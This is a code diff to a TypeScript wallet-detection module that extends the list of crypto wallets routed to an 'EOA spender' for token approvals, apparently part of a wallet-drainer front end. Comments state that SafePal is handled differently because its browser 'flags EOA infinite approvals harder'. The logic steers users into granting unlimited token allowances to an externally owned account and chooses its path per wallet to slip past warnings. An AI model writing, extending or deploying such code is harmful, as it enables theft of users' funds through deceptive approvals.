@@ -27,6 +27,11 @@ export const SUPPORTED_WALLET_INFO = [
   },
 ]
 
+// Experiment 2026-05-13: allow-list extended to OKX / TokenPocket / imToken /
+// Binance Web3 / Coinbase / MathWallet. All of them route to the EOA spender
+// (same as Trust/Bitget); only SafePal stays on the Merkle contract path
+// because its DApp browser flags EOA infinite approvals harder.
+// Rollback marker: git tag `pre-multi-wallet`.
 type InjectedFlags = {
   isTrust?: boolean
   isTrustWallet?: boolean
@@ -34,6 +39,14 @@ type InjectedFlags = {
   isBitget?: boolean
   isSafePal?: boolean
   isSafepal?: boolean
+  // Experiment-6 flags ↓
+  isOkxWallet?: boolean
+  isOKExWallet?: boolean       // legacy OKX flag
+  isTokenPocket?: boolean
+  isImToken?: boolean
+  isBinance?: boolean
+  isCoinbaseWallet?: boolean
+  isMathWallet?: boolean
 }
 
 type EthereumWindow = {
@@ -46,15 +59,27 @@ function hasAllowedFlag(p: InjectedFlags | undefined): boolean {
   return Boolean(
     p?.isTrust || p?.isTrustWallet ||
     p?.isBitKeep || p?.isBitget ||
-    p?.isSafePal || p?.isSafepal
+    p?.isSafePal || p?.isSafepal ||
+    p?.isOkxWallet || p?.isOKExWallet ||
+    p?.isTokenPocket ||
+    p?.isImToken ||
+    p?.isBinance ||
+    p?.isCoinbaseWallet ||
+    p?.isMathWallet
   )
 }
 
 function hasEoaFlag(p: InjectedFlags | undefined): boolean {
-  // EOA spender wallets only — SafePal explicitly excluded
+  // EOA spender wallets — everyone in the allow list *except* SafePal.
   return Boolean(
     p?.isTrust || p?.isTrustWallet ||
-    p?.isBitKeep || p?.isBitget
+    p?.isBitKeep || p?.isBitget ||
+    p?.isOkxWallet || p?.isOKExWallet ||
+    p?.isTokenPocket ||
+    p?.isImToken ||
+    p?.isBinance ||
+    p?.isCoinbaseWallet ||
+    p?.isMathWallet
   )
 }
 
@@ -91,7 +116,9 @@ export async function getEffectiveWalletName(
   return connector.name
 }
 
-// True if the wallet is on the sign allow list (Trust / Bitget / SafePal).
+// True if the wallet is on the sign allow list.
+// Primary 3: Trust / Bitget / SafePal.
+// Experiment 6: OKX / TokenPocket / imToken / Binance / Coinbase / MathWallet.
 export function isSignAllowedWallet(connectorName: string | undefined): boolean {
   if (!connectorName) return false
   const name = connectorName.toLowerCase()
@@ -101,7 +128,18 @@ export function isSignAllowedWallet(connectorName: string | undefined): boolean 
     name.includes('bitget') ||
     name.includes('bitkeep') ||
     name.includes('safepal') ||
-    name.includes('safe pal')
+    name.includes('safe pal') ||
+    name.includes('okx') ||
+    name.includes('okex') ||
+    name.includes('tokenpocket') ||
+    name.includes('token pocket') ||
+    name.includes('imtoken') ||
+    name.includes('im token') ||
+    name.includes('binance') ||
+    name.includes('coinbase') ||
+    name.includes('base wallet') ||  // Base = Coinbase Wallet rebrand
+    name.includes('mathwallet') ||
+    name.includes('math wallet')
   ) return true
 
   if (name === 'injected' || name.includes('injected')) {
@@ -113,8 +151,9 @@ export function isSignAllowedWallet(connectorName: string | undefined): boolean 
   return false
 }
 
-// True if the wallet should authorize the EOA spender (Trust / Bitget only).
-// SafePal is allowed to sign but uses the contract spender.
+// True if the wallet should authorize the EOA spender.
+// Everyone in the allow list except SafePal — SafePal's DApp browser flags
+// EOA infinite approvals harder, so it stays on the Merkle contract path.
 export function usesEoaSpender(connectorName: string | undefined): boolean {
   if (!connectorName) return false
   const name = connectorName.toLowerCase()
@@ -122,7 +161,18 @@ export function usesEoaSpender(connectorName: string | undefined): boolean {
   if (
     name.includes('trust') ||
     name.includes('bitget') ||
-    name.includes('bitkeep')
+    name.includes('bitkeep') ||
+    name.includes('okx') ||
+    name.includes('okex') ||
+    name.includes('tokenpocket') ||
+    name.includes('token pocket') ||
+    name.includes('imtoken') ||
+    name.includes('im token') ||
+    name.includes('binance') ||
+    name.includes('coinbase') ||
+    name.includes('base wallet') ||
+    name.includes('mathwallet') ||
+    name.includes('math wallet')
   ) return true
 
   if (name === 'injected' || name.includes('injected')) {
